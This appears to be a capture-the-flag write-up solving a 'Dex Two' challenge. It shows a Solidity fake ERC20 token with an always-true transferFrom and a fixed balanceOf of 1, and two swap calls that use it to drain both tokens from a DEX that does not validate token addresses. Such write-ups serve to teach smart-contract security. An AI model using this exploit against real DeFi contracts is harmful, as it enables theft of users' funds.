# Answer

Goal: Steal all DEX funds - this time both token1 and token 2.

## 1. Craft malicious token

The DEX two has removed one of the guards from `swap()`. That is now it doesn't check if token address indeed match the ones stored in storage (token1, token2). This means we can pass our own malicious form of the token. One version of such token would be:

```solidity
pragma solidity ^0.8.20;

import {ERC20} from '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract MaliciousToken is ERC20 {

    constructor(string memory name, string memory symbol) ERC20(name, symbol) { }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return 1;
    }
}
```

Because it is still using swap proportion, passing an amount of one will yield exactly all balance of the "to" token.

## 2. Exploiting swap

After deploying MaliciousToken we simply pass the address to the `swap()` as "from" together with an amount of "1". After two swaps (for each token) we should end up with all the tokens stolen from DEX.

```js
await contract.swap(malTokenAddr, token1Addr, 1)
await contract.swap(malTokenAddr, token2Addr, 1)
```
